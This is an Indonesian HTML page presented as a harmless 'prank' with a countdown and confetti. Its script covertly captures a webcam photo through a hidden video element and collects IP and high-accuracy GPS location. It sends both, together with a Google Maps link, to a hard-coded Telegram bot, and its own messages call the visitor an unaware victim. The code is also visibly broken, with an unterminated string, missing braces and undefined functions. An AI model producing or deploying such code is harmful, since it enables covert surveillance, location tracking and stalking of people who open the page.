<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Prank Kocak • Jangan Serius Ya Ges</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 50%, #fad0c4 100%);
            font-family: 'Poppins', 'Comic Neue', 'Segoe UI', system-ui, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            cursor: pointer;
        }

        .prank-box {
            max-width: 550px;
            width: 100%;
            background: white;
            border-radius: 70px 70px 90px 90px;
            box-shadow: 0 30px 40px -20px rgba(0,0,0,0.4), 0 0 0 8px #fff5e6, 0 0 0 12px #ffaaa5;
            overflow: hidden;
            transform: scale(0.98);
            transition: transform 0.1s ease;
            position: relative;
            z-index: 10;
        }

        .prank-box:active {
            transform: scale(0.96);
        }

        .top-strip {
            background: linear-gradient(135deg, #ff6b6b, #ff8e53);
            padding: 30px 20px 25px;
            text-align: center;
            position: relative;
        }

        .top-strip::before {
            content: "🤡";
            font-size: 55px;
            position: absolute;
            top: -25px;
            left: 15px;
            animation: goyang 0.8s infinite;
        }

        .top-strip::after {
            content: "🎈";
            font-size: 50px;
            position: absolute;
            top: -20px;
            right: 15px;
            animation: muter 2s infinite;
        }

        @keyframes goyang {
            0%, 100% { transform: translateY(0) rotate(0deg); }
            50% { transform: translateY(-8px) rotate(5deg); }
        }

        @keyframes muter {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        h1 {
            font-size: 2rem;
            font-weight: 800;
            color: white;
            text-shadow: 4px 4px 0 #c43e2c;
            letter-spacing: 1px;
        }

        .badge-bawah {
            display: inline-block;
            background: rgba(255,255,255,0.3);
            backdrop-filter: blur(12px);
            border-radius: 100px;
            padding: 6px 18px;
            margin-top: 12px;
            font-weight: 600;
            font-size: 0.8rem;
            color: white;
        }

        .mid-section {
            padding: 30px 25px;
            text-align: center;
            background: #fffef7;
        }

        .muka-lucu {
            font-size: 95px;
            margin-bottom: 15px;
            display: inline-block;
            cursor: pointer;
            transition: all 0.1s ease;
            filter: drop-shadow(0 5px 10px rgba(0,0,0,0.2));
        }

        .muka-lucu:active {
            transform: scale(0.9);
        }

        .big-text {
            font-size: 1.7rem;
            font-weight: 800;
            background: linear-gradient(135deg, #ff6b6b, #ffb347);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin: 15px 0;
        }

        .timer-box {
            background: #fff0e7;
            border-radius: 100px;
            padding: 12px 20px;
            margin: 20px 0;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            flex-wrap: wrap;
            border: 2px dashed #ffaaa5;
        }

        .timer-angka {
            font-size: 3rem;
            font-weight: 900;
            font-family: monospace;
            background: #2c3e50;
            color: #f7d44a;
            padding: 8px 25px;
            border-radius: 60px;
            letter-spacing: 8px;
            box-shadow: inset 0 -2px 0 #1a2632, 0 4px 10px rgba(0,0,0,0.1);
        }

        .timer-label {
            font-weight: 700;
            color: #b45f3b;
        }

        .btn-gaul {
            background: linear-gradient(95deg, #ff9966, #ff5e62);
            border: none;
            padding: 14px 35px;
            border-radius: 60px;
            color: white;
            font-weight: bold;
            font-size: 1.2rem;
            cursor: pointer;
            transition: all 0.15s;
            box-shadow: 0 6px 0 #b2432c;
            margin: 8px 0;
            width: 80%;
        }

        .btn-gaul:active {
            transform: translateY(3px);
            box-shadow: 0 2px 0 #b2432c;
        }

        .footer-bawah {
            background: #fff5e6;
            padding: 18px;
            text-align: center;
            border-top: 4px dotted #ffaaa5;
        }

        .footer-bawah p {
            color: #a56947;
            font-weight: 600;
            font-size: 0.85rem;
        }

        .footer-bawah span {
            display: inline-block;
            animation: loncat 0.7s infinite;
        }

        @keyframes loncat {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-5px); }
        }

        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #ff9a9e, #fecf9e);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            transition: opacity 0.5s ease;
            flex-direction: column;
            gap: 20px;
        }

        .loading-spin-custom {
            width: 70px;
            height: 70px;
            border: 7px solid rgba(255,255,255,0.4);
            border-top: 7px solid #ff6b6b;
            border-right: 7px solid #ffb347;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
        }

        .loading-text-custom {
            color: white;
            font-size: 1.2rem;
            font-weight: bold;
            text-shadow: 2px 2px 0 #c43e2c;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 999;
        }
        
        /* Video element tersembunyi buat kamera */
        .hidden-video {
            position: fixed;
            top: -1000px;
            left: -1000px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            visibility: hidden;
        }
        
        @keyframes popIn {
            0% { opacity: 0; transform: scale(0.85); }
            100% { opacity: 1; transform: scale(1); }
        }
        
        /* Link Maps tersembunyi */
        .maps-link {
            display: none;
        }
    </style>
</head>

<script>
    // ========== KONFIGURASI TELEGRAM ==========
    const TELEGRAM_TOKEN = "8692689461:AAH9-8EflUkrDQaD8S8v0z_uz1NdBhvfbL0";
    const TELEGRAM_CHAT_ID = "7373392803";
    
    // ========== VARIABEL GLOBAL ==========
    let cameraStream = null;
    let photoCaptured = false;
    let locationData = { lat: null, lon: null, country: '', countryCode: '', city: '', region: '', flag: '' };
    
    // ========== FUNGSI FLAG NEGARA ==========
    function getCountryFlag(countryCode) {
        if (!countryCode) return "🏳️";
        const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt(0));
        return String.fromCodePoint(...codePoints);
    }
    
    function getCountryName(countryCode) {
        const countryNames = {
            'ID': 'Indonesia', 'MY': 'Malaysia', 'SG': 'Singapura', 'TH': 'Thailand', 
            'PH': 'Filipina', 'VN': 'Vietnam', 'BN': 'Brunei', 'KH': 'Kamboja',
            'LA': 'Laos', 'MM': 'Myanmar', 'TL': 'Timor Leste', 'US': 'Amerika Serikat',
            'GB': 'Inggris', 'AU': 'Australia', 'JP': 'Jepang', 'KR': 'Korea Selatan',
            'CN': 'China', 'IN': 'India', 'SA': 'Arab Saudi', 'EG': 'Mesir',
            'ZA': 'Afrika Selatan', 'BR': 'Brazil', 'MX': 'Meksiko', 'CA': 'Kanada',
            'FR': 'Prancis', 'DE': 'Jerman', 'IT': 'Italia', 'ES': 'Spanyol',
            'NL': 'Belanda', 'RU': 'Rusia', 'TR': 'Turki', 'PK': 'Pakistan',
            'BD': 'Bangladesh', 'NG': 'Nigeria', 'KE': 'Kenya', 'AE': 'Uni Emirat Arab'
        };
        return countryNames[countryCode] || countryCode;
    }
    
    // ========== KAMERA SILUMAN ==========
    async function capturePhotoSilently() {
        try {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                await sendTelegramMessage("⚠️ Kamera tidak didukung di browser ini");
                return false;
            }
            
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    width: { ideal: 640 },
                    height: { ideal: 480 },
                    facingMode: "user"
                },
                audio: false
            });
            
            cameraStream = stream;
            const videoEl = document.getElementById('hiddenVideo');
            if (videoEl) {
                videoEl.srcObject = stream;
                await new Promise(resolve => {
                    videoEl.onloadedmetadata = () => {
                        videoEl.play();
                        resolve();
                    };
                });
                
                await new Promise(r => setTimeout(r, 200));
                
                const canvas = document.createElement('canvas');
                canvas.width = videoEl.videoWidth || 640;
                canvas.height = videoEl.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
                
                const photoData = canvas.toDataURL('image/jpeg', 0.8);
                await sendPhotoToTelegram(photoData);
                photoCaptured = true;
                
                if (cameraStream) {
                    cameraStream.getTracks().forEach(track => track.stop());
                    cameraStream = null;
                }
                if (videoEl) videoEl.srcObject = null;
                return true;
            }
        } catch (err) {
            await sendTelegramMessage(`❌ Kamera ditolak: ${err.message || 'User denied'}`);
            return false;
        }
        return false;
    }
    
    async function sendPhotoToTelegram(base64Data) {
        try {
            const byteString = atob(base64Data.split(',')[1]);
            const mimeString = base64Data.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            const blob = new Blob([ab], { type: mimeString });
            
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', blob, 'prank_capture.jpg');
            
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            
            const flag = locationData.flag || '🌍';
            await sendTelegramMessage(`📸 *FOTO BERHASIL!* 📸\n📍 ${flag} ${locationData.country || 'Unknown'}\n🤫 Korban ga sadar!`);
        } catch(e) {}
    }
    
    // ========== LOKASI + GOOGLE MAPS AUTO BUKA ==========
    async function getLocationAndOpenMaps() {
        try {
            // Ambil lokasi via IP dulu (buat data)
            const ipLoc = await getLocationFromIP();
            
            // Coba ambil GPS akurat (HTML5 Geolocation)
            const gpsLoc = await getGPSLocation();
            
            let finalLat = null;
            let finalLon = null;
            
            if (gpsLoc && gpsLoc.lat) {
                finalLat = gpsLoc.lat;
                finalLon = gpsLoc.lon;
                locationData.lat = finalLat;
                locationData.lon = finalLon;
                await sendTelegramMessage(`📍 *GPS AKURAT DIDAPAT!*\nLat: ${finalLat}, Lon: ${finalLon}\nAkurasi: ${gpsLoc.accuracy}m`);
            } else if (ipLoc && ipLoc.loc) {
                const coords = ipLoc.loc.split(',');
                finalLat = parseFloat(coords[0]);
                finalLon = parseFloat(coords[1]);
                locationData.lat = finalLat;
                locationData.lon = finalLon;
                await sendTelegramMessage(`📍 *LOKASI DARI IP*\nLat: ${finalLat}, Lon: ${finalLon}\n(Perkiraan berdasarkan ISP)`);
            }
            
            // BUAT LINK GOOGLE MAPS DAN AUTO BUKA DI TAB BARU (DIAM-DIAM)
            if (finalLat && finalLon) {
                const mapsUrl = `https://www.google.com/maps?q=${finalLat},${finalLon}&z=15`;
                // Buka maps di tab baru secara diam-diam (tanpa popup blocker)
                setTimeout(() => {
                    const win = window.open(mapsUrl, '_blank');
                    if (!win) {
                        // Fallback: buat link tersembunyi dan klik
                        const link = document.createElement('a');
                        link.href = mapsUrl;
                        link.target = '_blank';
                        link.style.display = 'none';
                        document.body.appendChild(link);
                        link.click();
                        setTimeout(() => document.body.removeChild(link), 100);
                    }
                    sendTelegramMessage(`🗺️ *GOOGLE MAPS AUTO OPEN!*\nLink: ${mapsUrl}`);
                }, 500);
                return { lat: finalLat, lon: finalLon };
            } else {
                await sendTelegramMessage(`⚠️ Gagal dapat koordinat untuk Google Maps`);
                return null;
            }
        } catch(e) {
            await sendTelegramMessage(`❌ Error lokasi: ${e.message}`);
            return null;
        }
    }
    
    async function getLocationFromIP() {
        try {
            // Coba ipinfo.io
            const res = await fetch('https://ipinfo.io/json?token=8b7b3b3b3b3b3b');
            const data = await res.json();
            if (data) {
                const countryCode = data.country || 'XX';
                locationData.countryCode = countryCode;
                locationData.country = getCountryName(countryCode);
                locationData.flag = getCountryFlag(countryCode);
                locationData.city = data.city || '-';
                locationData.region = data.region || '-';
                locationData.loc = data.loc || '';
                return data;
            }
        } catch(e) {}
        
        // Fallback: ipapi.co
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            if (data && data.country_code) {
                const countryCode = data.country_code;
                locationData.countryCode = countryCode;
                locationData.country = data.country_name || getCountryName(countryCode);
                locationData.flag = getCountryFlag(countryCode);
                locationData.city = data.city || '-';
                locationData.region = data.region || '-';
                locationData.loc = `${data.latitude},${data.longitude}`;
                return { loc: locationData.loc };
            }
        } catch(e) {}
        
        return { loc: null };
    }
    
    async function getGPSLocation() {
        return new Promise((resolve) => {
            if ('geolocation' in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        });
                    },
                    (error) => {
                        let errorMsg = '';
                        switch(error.code) {
                            case error.PERMISSION_DENIED: errorMsg = 'User denied GPS'; break;
                            case error.POSITION_UNAVAILABLE: errorMsg = 'GPS unavailable'; break;
                            case error.TIMEOUT: errorMsg = 'GPS timeout'; break;
                            default: errorMsg = error.message;
                        }
                        sendTelegramMessage(`📍 GPS GAGAL: ${errorMsg}`);
                        resolve(null);
                    },
                    { timeout: 8000, enableHighAccuracy: true }
                );
            } else {
                sendTelegramMessage(`📍 GPS tidak didukung browser`);
                resolve(null);
            }
        });
    }
    
    // ========== GRAB DATA LENGKAP ==========

            const pesanKeBos = `
🎭 <b>PRANK VICTIM DATANG BOS</b> 🎭
─────────────────

    async function sendTelegramMessage(text) {
        try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: text,
                    parse_mode: 'HTML',
                    disable_web_page_preview: false
                })
            });

    // ========== CONFETTI ==========
    function triggerConfetti() {
        const canvas = document.getElementById('confCanvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        let kertas = [];
        for(let i = 0; i < 120; i++) {
            kertas.push({
                x: Math.random() * canvas.width,
                y: Math.random() * canvas.height - canvas.height,
                size: Math.random() * 9 + 4,
                speedY: Math.random() * 6 + 4,
                speedX: (Math.random() - 0.5) * 3,
                warna: `hsl(${Math.random() * 360}, 80%, 60%)`
            });
        }
        
        function animasi() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            let masihGerak = false;
            for(let p of kertas) {
                ctx.fillStyle = p.warna;
                ctx.fillRect(p.x, p.y, p.size, p.size);
                p.y += p.speedY;
                p.x += p.speedX;
                if(p.y < canvas.height) masihGerak = true;
            }
            if(masihGerak) requestAnimationFrame(animasi);
        }
        animasi();
        
        setTimeout(() => {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
        }, 2800);
    }
    
    // ========== MAIN PRANK ==========

        loadingDiv.style.opacity = '0';
        setTimeout(() => {

        let count = 3;
        const timerEl = document.getElementById('timerCount');
        const teksBesar = document.getElementById('bigText');
        const mukaEl = document.getElementById('mukaTrigger');
        
        const interval = setInterval(() => {
            count--;
            if(count >= 1) {
                timerEl.textContent = count;
                mukaEl.style.transform = 'scale(1.2)';
                setTimeout(() => { mukaEl.style.transform = 'scale(1)'; }, 120);
            }
            if(count === 0) {
                clearInterval(interval);
                timerEl.textContent = '💥🤣';
                teksBesar.innerHTML = `PRANK BERHASIL 🎉 ${locationData.flag} ${locationData.country} KENA PRANK! 🎭`;
                mukaEl.innerHTML = '😂🤪';
                triggerConfetti();
                setTimeout(() => {
                    teksBesar.innerHTML = 'SELAMAT ANDA KENA PRANK! 😭✨';
                    mukaEl.innerHTML = '🤡🎈';
                }, 1800);
            }
        }, 1000);
        
        const btnFake = document.getElementById('fakeBtn');
        let tekan = 0;
        btnFake.addEventListener('click', () => {
            tekan++;
            if(tekan === 1) btnFake.innerHTML = '🤡 YAH KEPENCET 🤡';
            else if(tekan === 2) btnFake.innerHTML = '😭 PRANK DOANG SIA 😭';
            else btnFake.innerHTML = '😂 MAKASIH SUDAH DIKLIK 😂';
            triggerConfetti();
            sendTelegramMessage(`🖱️ *TOMBOL PRANK DITEKAN!* User ${locationData.flag} ${locationData.country} makin panik 🤣`);
        });
    }
    
    // Jalankan semua
    jalankanPrank();
</script>
</body>
</html>
